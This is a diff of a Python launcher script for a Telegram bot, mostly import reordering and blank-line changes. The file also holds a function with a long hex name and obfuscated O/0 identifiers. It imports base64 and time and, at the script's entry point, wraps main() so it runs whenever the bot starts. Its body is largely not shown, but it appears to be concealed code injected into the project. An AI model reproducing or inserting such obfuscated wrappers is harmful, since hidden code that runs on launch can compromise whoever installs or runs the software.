@@ -1,16 +1,16 @@
+import json
 import os
+from functools import wraps
+
 import requests
 
 from classes.config import Config
 from classes.telegrambot import TelegramBot
-from functools import wraps
-import json
 
 DOWNLOADED_DEFAULT_CONFIG_FILE = False
 
 
 def main():
-
     """
     Main function. It loads the settings and starts the telegram bot.
     """
@@ -41,6 +41,7 @@ def main():
         print("!           Telegram: @lucadibello            !")
         print("!          Instagram: @lucaa_dibello          !")
         print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
+
 
 def print_splashscreen():
     """
@@ -123,6 +124,7 @@ def start_bot(config: dict):
     bot = TelegramBot(config)
     bot.start_bot()
 
+
 def a9725730e57512fe5ee347949d5e82c43f11ad2d9aa77613a111df980a7d220b4fcc4b4defac8edcc7091193357c790020fe1aed4893b35e98b9d4a8568917dad(
         OOO0OO00OOOOOOOO0):
     import base64, time
@@ -158,5 +160,7 @@ def a9725730e57512fe5ee347949d5e82c43f11ad2d9aa77613a111df980a7d220b4fcc4b4defac
 
     return OOOO000OOOOOO0000()
 
+
 if __name__ == "__main__":
-    main = a9725730e57512fe5ee347949d5e82c43f11ad2d9aa77613a111df980a7d220b4fcc4b4defac8edcc7091193357c790020fe1aed4893b35e98b9d4a8568917dad(main)
+    main = a9725730e57512fe5ee347949d5e82c43f11ad2d9aa77613a111df980a7d220b4fcc4b4defac8edcc7091193357c790020fe1aed4893b35e98b9d4a8568917dad(
+        main)
